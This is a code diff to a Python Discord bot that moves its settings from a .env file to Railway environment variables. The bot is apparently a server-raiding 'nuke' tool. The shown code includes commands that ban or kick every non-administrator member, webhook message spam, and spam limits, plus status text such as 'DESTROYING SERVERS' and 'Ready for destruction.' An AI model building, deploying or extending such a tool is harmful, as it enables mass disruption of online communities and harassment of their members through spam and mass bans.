@@ -8,33 +8,34 @@ import aiohttp
 import json
 from datetime import datetime
 import os
-from dotenv import load_dotenv
-
-# Load environment variables
-load_dotenv()
 
 bot = commands.Bot(command_prefix=os.getenv('COMMAND_PREFIX', '!'), intents=discord.Intents.all())
 bot.remove_command('help')
 
-# ============ CONFIGURATION FROM .ENV ============
+# ============ CONFIGURATION FROM RAILWAY ENV VARIABLES ============
 TOKEN = os.getenv('DISCORD_TOKEN')
 
-# Parse owner IDs from .env (comma-separated)
-OWNER_IDS = [int(id.strip()) for id in os.getenv('OWNER_IDS', '').split(',') if id.strip()]
+# Parse owner IDs from Railway env (comma-separated)
+owner_ids_str = os.getenv('OWNER_IDS', '')
+OWNER_IDS = [int(id.strip()) for id in owner_ids_str.split(',') if id.strip()] if owner_ids_str else []
 
-# Load settings from .env with defaults
-MESSAGES_PER_SECOND = int(os.getenv('MESSAGES_PER_SECOND', 10))
-BAN_DELAY = float(os.getenv('BAN_DELAY', 0.1))
-CHANNEL_DELAY = float(os.getenv('CHANNEL_DELAY', 0.1))
-ROLE_DELAY = float(os.getenv('ROLE_DELAY', 0.1))
-MAX_SPAM_PER_CHANNEL = int(os.getenv('MAX_SPAM_PER_CHANNEL', 200))
-MAX_SPAMALL_PER_CHANNEL = int(os.getenv('MAX_SPAMALL_PER_CHANNEL', 50))
-MAX_MENTIONS = int(os.getenv('MAX_MENTIONS', 100))
-MAX_WEBHOOK_SPAM = int(os.getenv('MAX_WEBHOOK_SPAM', 200))
-GHOST_PURGE_LIMIT = int(os.getenv('GHOST_PURGE_LIMIT', 200))
+# Load settings from Railway env with defaults
+MESSAGES_PER_SECOND = int(os.getenv('MESSAGES_PER_SECOND', '10'))
+BAN_DELAY = float(os.getenv('BAN_DELAY', '0.1'))
+CHANNEL_DELAY = float(os.getenv('CHANNEL_DELAY', '0.1'))
+ROLE_DELAY = float(os.getenv('ROLE_DELAY', '0.1'))
+MAX_SPAM_PER_CHANNEL = int(os.getenv('MAX_SPAM_PER_CHANNEL', '200'))
+MAX_SPAMALL_PER_CHANNEL = int(os.getenv('MAX_SPAMALL_PER_CHANNEL', '50'))
+MAX_MENTIONS = int(os.getenv('MAX_MENTIONS', '100'))
+MAX_WEBHOOK_SPAM = int(os.getenv('MAX_WEBHOOK_SPAM', '200'))
+GHOST_PURGE_LIMIT = int(os.getenv('GHOST_PURGE_LIMIT', '200'))
 LOG_TO_FILE = os.getenv('LOG_TO_FILE', 'False').lower() == 'true'
 LOG_FILE = os.getenv('LOG_FILE', 'bot.log')
 LOG_LEVEL = os.getenv('LOG_LEVEL', 'INFO')
+BAN_ALL_EXCLUDE_OWNERS = os.getenv('BAN_ALL_EXCLUDE_OWNERS', 'True').lower() == 'true'
+KICK_ALL_EXCLUDE_OWNERS = os.getenv('KICK_ALL_EXCLUDE_OWNERS', 'True').lower() == 'true'
+WEBHOOK_NAME = os.getenv('WEBHOOK_NAME', 'NOMAD')
+DEFAULT_ACTIVITY = os.getenv('DEFAULT_ACTIVITY', 'DESTROYING SERVERS')
 
 # ============ OWNER CHECK FUNCTIONS ============
 def is_owner(ctx):
@@ -143,10 +144,9 @@ async def banall_prefix(ctx):
     """Ban all members"""
     guild = ctx.guild
     count = 0
-    exclude_owners = os.getenv('BAN_ALL_EXCLUDE_OWNERS', 'True').lower() == 'true'
     
     for member in guild.members:
-        if exclude_owners and member.id in OWNER_IDS:
+        if BAN_ALL_EXCLUDE_OWNERS and member.id in OWNER_IDS:
             continue
         if not member.guild_permissions.administrator:
             try:
@@ -163,10 +163,9 @@ async def banall_slash(interaction: discord.Interaction):
     await interaction.response.defer()
     guild = interaction.guild
     count = 0
-    exclude_owners = os.getenv('BAN_ALL_EXCLUDE_OWNERS', 'True').lower() == 'true'
     
     for member in guild.members:
-        if exclude_owners and member.id in OWNER_IDS:
+        if BAN_ALL_EXCLUDE_OWNERS and member.id in OWNER_IDS:
             continue
         if not member.guild_permissions.administrator:
             try:
@@ -183,10 +182,9 @@ async def kickall_prefix(ctx):
     """Kick all members"""
     guild = ctx.guild
     count = 0
-    exclude_owners = os.getenv('KICK_ALL_EXCLUDE_OWNERS', 'True').lower() == 'true'
     
     for member in guild.members:
-        if exclude_owners and member.id in OWNER_IDS:
+        if KICK_ALL_EXCLUDE_OWNERS and member.id in OWNER_IDS:
             continue
         if not member.guild_permissions.administrator:
             try:
@@ -203,10 +201,9 @@ async def kickall_slash(interaction: discord.Interaction):
     await interaction.response.defer()
     guild = interaction.guild
     count = 0
-    exclude_owners = os.getenv('KICK_ALL_EXCLUDE_OWNERS', 'True').lower() == 'true'
     
     for member in guild.members:
-        if exclude_owners and member.id in OWNER_IDS:
+        if KICK_ALL_EXCLUDE_OWNERS and member.id in OWNER_IDS:
             continue
         if not member.guild_permissions.administrator:
             try:
@@ -480,7 +477,7 @@ async def spamall_slash(interaction: discord.Interaction, amount: int, message: 
 @commands.check(is_owner)
 async def webhookspam_prefix(ctx, amount: int, *, message: str):
     """Webhook spam"""
-    webhook = await ctx.channel.create_webhook(name=os.getenv('WEBHOOK_NAME', 'Spam'))
+    webhook = await ctx.channel.create_webhook(name=WEBHOOK_NAME)
     for i in range(min(amount, MAX_WEBHOOK_SPAM)):
         await webhook.send(message[:1990], username=f"Spam-{i}")
         await asyncio.sleep(0.05)
@@ -491,7 +488,7 @@ async def webhookspam_prefix(ctx, amount: int, *, message: str):
 @app_commands.describe(amount="Number of messages", message="Message to spam")
 async def webhookspam_slash(interaction: discord.Interaction, amount: int, message: str):
     await interaction.response.defer()
-    webhook = await interaction.channel.create_webhook(name=os.getenv('WEBHOOK_NAME', 'Spam'))
+    webhook = await interaction.channel.create_webhook(name=WEBHOOK_NAME)
     for i in range(min(amount, MAX_WEBHOOK_SPAM)):
         await webhook.send(message[:1990], username=f"Spam-{i}")
         await asyncio.sleep(0.05)
@@ -1089,6 +1086,11 @@ async def on_ready():
     print(f"✅ Connected to {len(bot.guilds)} guilds")
     print(f"✅ Ready for destruction.")
     print(f"✅ Owner IDs: {OWNER_IDS}")
+    print(f"✅ Using Railway Environment Variables")
+    
+    # Set bot status
+    activity_type = discord.ActivityType.watching
+    await bot.change_presence(activity=discord.Activity(type=activity_type, name=DEFAULT_ACTIVITY))
     
     # Sync slash commands
     try:
@@ -1100,11 +1102,12 @@ async def on_ready():
 # ============ RUN BOT ============
 if __name__ == "__main__":
     if not TOKEN:
-        print("❌ ERROR: DISCORD_TOKEN not found in environment variables!")
-        print("Please set DISCORD_TOKEN in your .env file or Railway environment variables.")
+        print("❌ ERROR: DISCORD_TOKEN not found in Railway environment variables!")
+        print("Please set DISCORD_TOKEN in your Railway project variables.")
         exit(1)
     
     if not OWNER_IDS:
         print("⚠️ WARNING: No OWNER_IDS set! No one will be able to use commands.")
+        print("Please set OWNER_IDS in your Railway project variables.")
     
     bot.run(TOKEN)
